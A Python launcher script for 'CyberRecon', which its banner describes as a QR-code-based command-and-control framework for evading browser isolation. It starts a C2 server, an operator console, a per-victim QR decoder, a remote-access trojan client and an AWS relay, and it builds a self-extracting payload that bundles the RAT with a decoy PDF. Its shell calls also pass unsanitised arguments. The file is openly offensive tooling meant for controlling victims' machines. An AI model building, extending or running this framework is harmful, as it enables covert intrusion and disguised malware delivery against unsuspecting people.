"""
CyberRecon Unified Launcher
Start C2 Server, QR Decoder, or Operator CLI from one entry point.
"""

import argparse
import sys
import os


def start_c2():
    """Start the C2 Server."""
    print("[*] Starting CyberRecon C2 Server...")
    os.system("python c2_server.py")


def start_decoder(victim_id, c2_url):
    """Start the QR Decoder client."""
    print(f"[*] Starting QR Decoder for victim: {victim_id}")
    os.system(f"python qr_decoder.py --c2 {c2_url} --victim-id {victim_id} --interval 5")


def start_operator(c2_url):
    """Start the Operator CLI."""
    print("[*] Starting Operator CLI...")
    os.system(f"python operator_cli.py --c2 {c2_url}")


def start_rat(c2_host, c2_port):
    """Start the RAT client."""
    print("[*] Starting CyberRecon RAT Client...")
    os.system(f"python rat_client.py --c2 {c2_host} --c2-port {c2_port}")


def start_aws_relay(c2_backend):
    """Start AWS Relay Server."""
    print("[*] Starting AWS Relay Server...")
    os.system(f"python aws_relay.py --c2 {c2_backend}")


def build_payload(rat_path, decoy_path, c2_host, c2_port):
    """Build SFX payload."""
    print("[*] Building SFX Payload...")
    os.system(f"python sfx_payload.py --rat {rat_path} --decoy {decoy_path} --c2-host {c2_host} --c2-port {c2_port}")


def run_tests():
    """Run integration tests."""
    print("[*] Running integration tests...")
    os.system("python tests/test_demo.py")


def print_banner():
    print("""
   ____      _                  ____                      
  / ___|   _| |__   ___ _ __   |  _ \ ___  ___ ___  _ __  
 | |  | | | | '_ \ / _ \ '__|  | |_) / _ \/ __/ _ \| '_ \ 
 | |__| |_| | |_) |  __/ |     |  _ <  __/ (_| (_) | | | |
  \____\__, |_.__/ \___|_|     |_| \_\___|\___\___/|_| |_|
        |___/                                              

  CyberRecon: QR Code-Based C2 Framework
  Mandiant QR C2 Bypass - Browser Isolation Evasion
  Version: 1.0 | Final Review Build
    """)


def main():
    parser = argparse.ArgumentParser(
        description="CyberRecon Unified Launcher",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python main.py --mode c2                    # Start C2 Server
  python main.py --mode operator              # Start Operator CLI
  python main.py --mode decoder --victim-id abc123  # Start QR Decoder
  python main.py --mode rat                   # Start RAT Client
  python main.py --mode relay                 # Start AWS Relay
  python main.py --mode build                 # Build SFX Payload
  python main.py --mode test                  # Run tests
        """
    )

    parser.add_argument("--mode", required=True,
                        choices=["c2", "operator", "decoder", "rat", "relay", "build", "test"],
                        help="Component to launch")
    parser.add_argument("--c2-url", default="http://127.0.0.1:8443",
                        help="C2 server URL")
    parser.add_argument("--c2-host", default="127.0.0.1",
                        help="C2 server host")
    parser.add_argument("--c2-port", type=int, default=8443,
                        help="C2 server port")
    parser.add_argument("--victim-id",
                        help="Victim ID for decoder mode")
    parser.add_argument("--rat-path", default="rat_client.py",
                        help="Path to RAT script for build mode")
    parser.add_argument("--decoy-path", default="decoy.pdf",
                        help="Path to decoy PDF for build mode")

    args = parser.parse_args()

    print_banner()

    if args.mode == "c2":
        start_c2()
    elif args.mode == "operator":
        start_operator(args.c2_url)
    elif args.mode == "decoder":
        if not args.victim_id:
            print("[!] --victim-id required for decoder mode")
            sys.exit(1)
        start_decoder(args.victim_id, args.c2_url)
    elif args.mode == "rat":
        start_rat(args.c2_host, args.c2_port)
    elif args.mode == "relay":
        start_aws_relay(args.c2_url)
    elif args.mode == "build":
        build_payload(args.rat_path, args.decoy_path, args.c2_host, args.c2_port)
    elif args.mode == "test":
        run_tests()


if __name__ == "__main__":
    main()
